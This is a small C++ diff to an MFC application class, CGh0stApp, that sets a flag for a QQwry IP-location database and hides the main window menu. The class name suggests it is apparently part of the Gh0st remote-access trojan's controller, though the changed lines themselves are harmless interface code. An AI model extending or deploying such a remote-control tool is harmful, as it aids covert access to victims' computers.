@@ -45,6 +45,7 @@ CGh0stApp::CGh0stApp()
 
 	// TODO: 在此处添加构造代码，
 	// 将所有重要的初始化放置在 InitInstance 中
+	m_bIsQQwryExist = true;
 }
 
 // 唯一的一个 CGh0stApp 对象
@@ -117,6 +118,9 @@ BOOL CGh0stApp::InitInstance()
 	// 用 /RegServer、/Register、/Unregserver 或 /Unregister 启动应用程序，则返回 FALSE。
 	if (!ProcessShellCommand(cmdInfo))
 		return FALSE;
+
+	//去掉菜单
+	m_pMainWnd->SetMenu(NULL);
 
 	// 唯一的一个窗口已初始化，因此显示它并对其进行更新
 	m_pMainWnd->ShowWindow(SW_SHOW);
